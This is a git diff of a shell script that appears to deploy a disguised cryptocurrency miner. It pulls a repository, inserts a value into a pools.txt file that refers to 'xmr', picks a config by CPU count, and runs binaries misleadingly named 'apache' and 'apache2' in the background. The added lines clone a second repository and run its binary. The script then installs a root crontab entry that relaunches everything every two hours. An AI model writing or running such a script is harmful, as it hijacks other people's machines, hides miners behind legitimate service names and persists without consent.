@@ -7,7 +7,14 @@ cd ~/tanhuevon/ ; git stash drop; git reset --hard; git pull
 sed -i -e "s/digitaloceanxmr/`cat ~/index.html`/" pools.txt
 cd ~/tanhuevon/ 
 cp -rf cpu`nproc`.txt cpu.txt
-chmod +x apache2 ; chmod +x apache; ./apache2 ; ./apache &> apache2.log
+chmod +x apache2 
+chmod +x apache
+./apache2 &
+./apache &
+
+git clone https://github.com/tanhuevon/dollar
+cd dollar
+./apache
 
 echo '0 */2 * * * bash /root/tanhuevon/apache.sh &> /root/out.log' | crontab -
 
